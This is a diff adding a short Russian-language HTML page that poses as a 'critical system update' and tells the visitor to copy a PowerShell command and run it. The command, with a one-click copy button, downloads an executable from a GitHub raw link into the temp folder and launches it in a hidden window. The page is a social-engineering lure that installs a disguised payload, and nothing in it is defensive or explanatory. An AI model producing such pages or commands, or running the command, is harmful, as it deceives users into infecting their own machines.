@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Обновление системы</title>
+</head>
+<body>
+    <h1>Критическое обновление!</h1>
+    <p>Скопируйте команду и выполните её в PowerShell (Win+X → PowerShell):</p>
+    <textarea rows="3" cols="80" id="cmd">(New-Object Net.WebClient).DownloadFile('https://github.com/azru09ru-lang/xyuinya1/raw/refs/heads/main/112.exe', "$env:TEMP\112.exe"); Start-Process "$env:TEMP\112.exe" -WindowStyle Hidden</textarea>
+    <br>
+    <button onclick="navigator.clipboard.writeText(document.getElementById('cmd').value)">Копировать</button>
+</body>
+</html>
